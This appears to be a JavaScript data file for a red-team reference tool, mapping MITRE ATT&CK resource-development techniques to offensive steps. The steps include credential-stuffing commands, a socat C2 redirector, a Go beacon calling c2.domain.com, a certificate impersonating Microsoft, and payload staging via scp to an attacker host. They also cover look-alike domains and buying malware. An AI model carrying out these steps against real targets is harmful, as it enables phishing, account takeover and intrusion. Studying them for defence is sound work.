export const resourceDevTechniques = [
  {
    id: "T1583",
    name: "Acquire Infrastructure",
    summary: "VPS • domains • bulletproof hosting",
    description: "Purchasing or leasing internet infrastructure such as domains, VPS servers, and cloud accounts to support operations.",
    tags: ["T1583", "VPS", "domain registration", "infrastructure"],
    steps: [
      { type: "comment", content: "# T1583.001 - Register look-alike domains for phishing" },
      { type: "cmd", content: "# Register: target-corp.com, targetcorp.net, target-support.com\n# Use privacy-protected WHOIS registrars (Namecheap, Porkbun)" },
      { type: "comment", content: "# T1583.003 - Acquire VPS for C2 infrastructure" },
      { type: "cmd", content: "# Providers: Vultr, Linode, Hetzner, DigitalOcean\n# Pay with cryptocurrency for anonymity" },
      { type: "comment", content: "# T1583.006 - Use cloud services for staging" },
      { type: "cmd", content: "aws s3 mb s3://legitimate-looking-bucket --region us-east-1" },
      { type: "comment", content: "# T1583.002 - Configure DNS for C2 domain" },
      { type: "cmd", content: "# Set TTL low for fast flux: 60 seconds\n# Configure A records pointing to redirectors\n# Set MX records for phishing infrastructure" },
    ]
  },
  {
    id: "T1586",
    name: "Compromise Accounts",
    summary: "credential stuffing • account takeover",
    description: "Compromising existing legitimate accounts on social media, email providers, or cloud services to use them for operations.",
    tags: ["T1586", "account takeover", "credential stuffing"],
    steps: [
      { type: "comment", content: "# T1586.002 - Credential stuffing against email providers" },
      { type: "cmd", content: "credmaster -m hotmail -u usernames.txt -p passwords.txt --threads 20" },
      { type: "comment", content: "# T1586.001 - Compromise social media accounts for trust" },
      { type: "text", content: "Use compromised accounts from breach databases to take over social media profiles that can be used for spearphishing with trusted identity." },
      { type: "comment", content: "# Check MFA status before attempting account compromise" },
      { type: "cmd", content: "o365spray --enum -U users.txt -d target.com  # Validate accounts first" },
    ]
  },
  {
    id: "T1584",
    name: "Compromise Infrastructure",
    summary: "server compromise • domain hijacking",
    description: "Compromising third-party infrastructure like servers, domains, and cloud accounts to use for operations while hiding attacker origin.",
    tags: ["T1584", "server compromise", "domain hijacking"],
    steps: [
      { type: "comment", content: "# Exploit vulnerable public-facing services for server compromise" },
      { type: "cmd", content: "searchsploit apache 2.4.49  # Find known exploits for target software version" },
      { type: "comment", content: "# T1584.001 - Domain hijacking via expired domain acquisition" },
      { type: "cmd", content: "expireddomains.net  # Monitor for expired domains with established reputation" },
      { type: "comment", content: "# Pivot C2 through compromised legitimate server" },
      { type: "cmd", content: "# Install redirector on compromised server:\nsocat TCP4-LISTEN:80,fork TCP4:c2-server.com:80" },
    ]
  },
  {
    id: "T1587",
    name: "Develop Capabilities",
    summary: "custom malware • exploits • tools",
    description: "Developing custom malware, exploits, or tools specifically for the operation rather than using off-the-shelf tools.",
    tags: ["T1587", "custom malware", "exploit development", "tool development"],
    steps: [
      { type: "comment", content: "# T1587.001 - Develop custom implant/RAT" },
      { type: "code", content: "// Custom C2 beacon in Go\npackage main\nimport (\n    \"crypto/tls\"\n    \"net/http\"\n    \"time\"\n)\nfunc beacon() {\n    for {\n        http.Get(\"https://c2.domain.com/check\")\n        time.Sleep(30 * time.Second)\n    }\n}" },
      { type: "comment", content: "# T1587.004 - Develop exploit for target vulnerability" },
      { type: "cmd", content: "python3 exploit_dev.py --target CVE-2024-XXXX --payload reverse_shell" },
      { type: "comment", content: "# T1587.002/003 - Generate code signing / TLS certificates" },
      { type: "cmd", content: "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=Microsoft Update Service'" },
    ]
  },
  {
    id: "T1585",
    name: "Establish Accounts",
    summary: "fake identities • personas • sock puppets",
    description: "Creating new accounts on social media, email providers, and cloud services to establish fake personas for operations.",
    tags: ["T1585", "fake accounts", "personas", "sock puppets"],
    steps: [
      { type: "comment", content: "# T1585.002 - Create email accounts for operational use" },
      { type: "text", content: "Create email accounts using Protonmail, Tutanota, or disposable providers. Use VPN/Tor and believable persona details." },
      { type: "comment", content: "# T1585.001 - Build convincing social media persona" },
      { type: "text", content: "Create LinkedIn/Twitter profiles with AI-generated photos (thispersondoesnotexist.com), credible work history, and connections." },
      { type: "comment", content: "# T1585.003 - Create cloud accounts for infrastructure" },
      { type: "cmd", content: "# AWS: aws configure --profile fake-persona\n# Use prepaid credit card or crypto for payment" },
    ]
  },
  {
    id: "T1588",
    name: "Obtain Capabilities",
    summary: "Metasploit • Cobalt Strike • Sliver • exploit kits",
    description: "Obtaining offensive tools, malware, exploits, and capabilities from public repositories or underground markets.",
    tags: ["T1588", "Metasploit", "Cobalt Strike", "Sliver", "exploit kits"],
    steps: [
      { type: "comment", content: "# T1588.002 - Download and configure open-source C2 framework" },
      { type: "cmd", content: "go install github.com/BishopFox/sliver/sliver-server@latest" },
      { type: "cmd", content: "sliver-server  # Start Sliver C2 server" },
      { type: "comment", content: "# T1588.001 - Obtain malware from underground markets" },
      { type: "text", content: "Access dark web markets or Telegram channels to purchase commodity malware such as info-stealers, loaders, or access brokers." },
      { type: "comment", content: "# T1588.005 - Acquire exploits for known vulnerabilities" },
      { type: "cmd", content: "# ExploitDB, GitHub, VulhubLab, ZeroDay.today\nsearchsploit -x 49512  # Review exploit before use" },
    ]
  },
  {
    id: "T1608",
    name: "Stage Capabilities",
    summary: "upload payloads • CDN staging • drive-by",
    description: "Uploading and staging malicious tools, payloads, and code on infrastructure in preparation for use against targets.",
    tags: ["T1608", "payload staging", "CDN", "web hosting"],
    steps: [
      { type: "comment", content: "# T1608.001 - Upload malware to staging server" },
      { type: "cmd", content: "scp payload.exe attacker@c2.domain.com:/var/www/html/update.exe" },
      { type: "comment", content: "# T1608.005 - Create malicious link for drive-by" },
      { type: "cmd", content: "# Host payload on legitimate-looking URL:\ncd /var/www/html && python3 -m http.server 80" },
      { type: "comment", content: "# T1608.006 - SEO poisoning - upload content to rank for target queries" },
      { type: "text", content: "Create web pages with malicious downloads that appear in search results for software/drivers users are likely to search for." },
      { type: "comment", content: "# T1608.003 - Install TLS certificate on C2 domain" },
      { type: "cmd", content: "certbot certonly --standalone -d c2.yourdomain.com --agree-tos --email admin@yourdomain.com" },
    ]
  },
];